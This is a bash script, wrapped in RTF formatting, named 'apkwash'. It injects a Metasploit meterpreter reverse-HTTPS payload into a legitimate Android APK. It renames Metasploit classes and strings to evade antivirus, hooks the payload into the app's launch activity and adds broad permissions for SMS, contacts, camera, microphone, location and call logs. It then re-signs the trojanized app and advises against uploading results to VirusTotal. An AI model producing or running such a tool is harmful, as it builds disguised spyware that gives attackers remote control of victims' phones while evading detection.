{\rtf1\ansi\ansicpg1252\cocoartf1504\cocoasubrtf760
{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
{\colortbl;\red255\green255\blue255;\red42\green42\blue42;\red255\green255\blue255;}
{\*\expandedcolortbl;;\cssrgb\c21961\c21961\c21961;\cssrgb\c100000\c100000\c100000;}
\margl1440\margr1440\vieww20900\viewh8400\viewkind0
\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0

\f0\fs24 \cf0 #!/bin/bash\
\
# Author: Justin Breed\
# Purpose: AV Evasion along with injecting a meterpreter payload into another apk file\
# Date: 0% detection as of 16Feb17\
\
if [ $# -eq 0 ] || [ $\{1: -4\} != ".apk" ] || [ $2 -eq 0 ] || [ $\{2: -4\} != ".apk" ]; then\
    echo\
    echo "-------------INVALID ARGUMENT------------"\
    echo "Please pass in a msfvenom generated .apk file followed by the .apk you want to inject it into"\
    echo "msfvenom -p android/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> -o payload.apk"\
    echo "Ex: apkwash payload.apk com.myapp.byme.apk"\
    echo "-----------------------------------------"\
    exit 1\
fi\
\
#Checking dependencies\
type apktool.jar >/dev/null 2>&1 || \{ \
   echo "ApkTool depenency needed... downloading"\
   wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.2.2.jar\
   mv apktool_2.2.2.jar apktool.jar\
   chmod +x apktool.jar\
   mv apktool.jar /usr/local/bin/.\
\}\
\
# Variables\
fullPathPayload=$1\
fullPathOriginal=$2\
payloadApk=$(basename $fullPathPayload)\
originalApk=$(basename $fullPathOriginal)\
VAR1=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # smali dir renaming\
VAR2=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # smali dir renaming\
VAR3=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # Payload.smali renaming\
JAR=`which apktool.jar`\
\
#APKTool to pull apart the package\
java -jar $JAR d -f -o /tmp/payload $fullPathPayload\
java -jar $JAR d -f -o /tmp/original $fullPathOriginal\
\
#Changing the default folder and filenames being flagged by AV\
mv /tmp/payload/smali/com/metasploit /tmp/payload/smali/com/$VAR1\
mv /tmp/payload/smali/com/$VAR1/stage /tmp/payload/smali/com/$VAR1/$VAR2\
mv /tmp/payload/smali/com/$VAR1/$VAR2/Payload.smali /tmp/payload/smali/com/$VAR1/$VAR2/$VAR3.smali\
\
#Updating path in .smali files\
sed -i "s#/metasploit/stage#/$VAR1/$VAR2#g" /tmp/payload/smali/com/$VAR1/$VAR2/*\
sed -i "s#Payload#$VAR3#g" /tmp/payload/smali/com/$VAR1/$VAR2/*\
\
#Flagged by AV, changed to something not as obvious\
sed -i "s#com.metasploit.meterpreter.AndroidMeterpreter#com.Android#" /tmp/payload/smali/com/$VAR1/$VAR2/$VAR3.smali\
sed -i "s#payload#loader#g" /tmp/payload/smali/com/$VAR1/$VAR2/$VAR3.smali\
\
#copy over payload files into the original apk files\
cp -r /tmp/payload/smali/com/$VAR1 /tmp/original/smali/com/.\
\
#locate the launcher smali\
cat /tmp/original/AndroidManifest.xml | grep string/app_name | grep android:launchMode > /tmp/output\
grep -oP 'com.*." ' /tmp/output > /tmp/output_1 	# breaks apart the com object\
sed -i 's#"##' /tmp/output_1  			# gets rid of the \'93\
sed -i 's/\\./\\//g' /tmp/output_1\
sed -i 's/[ \\t]*$//' /tmp/output_1\
launcherSmali=`cat /tmp/output_1`.smali\
echo "Found smali launched in AndroidManifest.xml: $launcherSmali"\
\
#add injection to smali file\
sed -i "/onCreate(Landroid/ainvoke-static \{p0\}, Lcom/$VAR1/$VAR2/$VAR3;->start(Landroid/content/Context;)V" /tmp/original/smali/$launcherSmali\
\
#add all dependencies... because, why not?\
sed -i "/platformBuildVersionName/a<uses-permission android:name=\\"android.permission.SET_WALLPAPER\\"/>" /tmp/original/AndroidManifest.xml\
sed -i "/platformBuildVersionName/a<uses-permission android:name=\\"android.permission.INTERNET\\"/>" /tmp/original/AndroidManifest.xml\
sed -i "/platformBuildVersionName/a<uses-permission android:name=\\"android.permission.ACCESS_WIFI_STATE\\"/>" /tmp/original/AndroidManifest.xml\
sed -i "/platformBuildVersionName/a<uses-permission android:name=\\"android.permission.CHANGE_WIFI_STATE\\"/>" /tmp/original/AndroidManifest.xml\
sed -i "/platformBuildVersionName/a<uses-permission android:name=\\"android.permission.ACCESS_NETWORK_STATE\\"/>" /tmp/original/AndroidManifest.xml\
sed -i "/platformBuildVersionName/a<uses-permission android:name=\\"android.permission.ACCESS_COARSE_LOCATION\\"/>" /tmp/original/AndroidManifest.xml\
sed -i "/platformBuildVersionName/a<uses-permission android:name=\\"android.permission.ACCESS_FINE_LOCATION\\"/>" /tmp/original/AndroidManifest.xml\
sed -i "/platformBuildVersionName/a<uses-permission android:name=\\"android.permission.READ_PHONE_STATE\\"/>" /tmp/original/AndroidManifest.xml\
sed -i "/platformBuildVersionName/a<uses-permission android:name=\\"android.permission.SEND_SMS\\"/>" /tmp/original/AndroidManifest.xml\
sed -i "/platformBuildVersionName/a<uses-permission android:name=\\"android.permission.RECEIVE_SMS\\"/>" /tmp/original/AndroidManifest.xml\
sed -i "/platformBuildVersionName/a<uses-permission android:name=\\"android.permission.RECORD_AUDIO\\"/>" /tmp/original/AndroidManifest.xml\
sed -i "/platformBuildVersionName/a<uses-permission android:name=\\"android.permission.CALL_PHONE\\"/>" /tmp/original/AndroidManifest.xml\
sed -i "/platformBuildVersionName/a<uses-permission android:name=\\"android.permission.READ_CONTACTS\\"/>" /tmp/original/AndroidManifest.xml\
sed -i "/platformBuildVersionName/a<uses-permission android:name=\\"android.permission.WRITE_CONTACTS\\"/>" /tmp/original/AndroidManifest.xml\
sed -i "/platformBuildVersionName/a<uses-permission android:name=\\"android.permission.RECORD_AUDIO\\"/>" /tmp/original/AndroidManifest.xml\
sed -i "/platformBuildVersionName/a<uses-permission android:name=\\"android.permission.WRITE_SETTINGS\\"/>" /tmp/original/AndroidManifest.xml\
sed -i "/platformBuildVersionName/a<uses-permission android:name=\\"android.permission.CAMERA\\"/>" /tmp/original/AndroidManifest.xml\
sed -i "/platformBuildVersionName/a<uses-permission android:name=\\"android.permission.READ_SMS\\"/>" /tmp/original/AndroidManifest.xml\
sed -i "/platformBuildVersionName/a<uses-permission android:name=\\"android.permission.WRITE_EXTERNAL_STORAGE\\"/>" /tmp/original/AndroidManifest.xml\
sed -i "/platformBuildVersionName/a<uses-permission android:name=\\"android.permission.RECEIVE_BOOT_COMPLETED\\"/>" /tmp/original/AndroidManifest.xml\
sed -i "/platformBuildVersionName/a<uses-permission android:name=\\"android.permission.SET_WALLPAPER\\"/>" /tmp/original/AndroidManifest.xml\
sed -i "/platformBuildVersionName/a<uses-permission android:name=\\"android.permission.READ_CALL_LOG\\"/>" /tmp/original/AndroidManifest.xml\
sed -i "/platformBuildVersionName/a<uses-permission android:name=\\"android.permission.WRITE_CALL_LOG\\"/>" /tmp/original/AndroidManifest.xml\
sed -i "/platformBuildVersionName/a<uses-permission android:name=\\"android.permission.WAKE_LOCK\\"/>" /tmp/original/AndroidManifest.xml\
sed -i "/SET_WALLPAPER/a<uses-feature android:name=\\"android.hardware.camera\\"/>" /tmp/original/AndroidManifest.xml\
sed -i "/SET_WALLPAPER/a<uses-feature android:name=\\"android.hardware.camera.autofocus\\"/>" /tmp/original/AndroidManifest.xml\
sed -i "/SET_WALLPAPER/a<uses-feature android:name=\\"android.hardware.microphone\\"/>" /tmp/original/AndroidManifest.xml\
    \
\
#Rebuild the package using APKTool\
java -jar $JAR b /tmp/original\
echo; \
echo "Injected package created: `pwd`/injected_"$originalApk\
echo "Moving package to the current directory"\
mv /tmp/original/dist/$originalApk injected_$originalApk\
echo\
\
#Signing the package\
echo "Checking for ~/.android/debug.keystore for signing"\
if [ ! -f ~/.android/debug.keystore ]; then\
    echo\
    echo "Debug key not found. Generating one now."\
    echo\
    if [ ! -d "~/.android" ]; then\
      mkdir ~/.android\
    fi\
    keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000\
fi\
echo;\
echo "Attempting to sign the package with your andrid debug key"\
jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA injected_$originalApk androiddebugkey\
echo\
echo "Signed the .apk file with ~/.android/debug.keystore"\
echo "Simply remove the debug.keystore file and re-run the program to be prompted to create a new debug key"\
echo\
echo "Cleaning up"\
rm -rf /tmp/payload\
rm -rf /tmp/original\
rm /tmp/output\
rm /tmp/output_1\
echo "Finished"\
echo\
echo "Enjoy! Please do not upload the washed files to VirusTotal.com."\
echo "Use nodistribute.com instead"\
\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
\AppleTypeServices\AppleTypeServicesF65539 \cf2 \cb3 \expnd0\expndtw0\kerning0
\
    \
}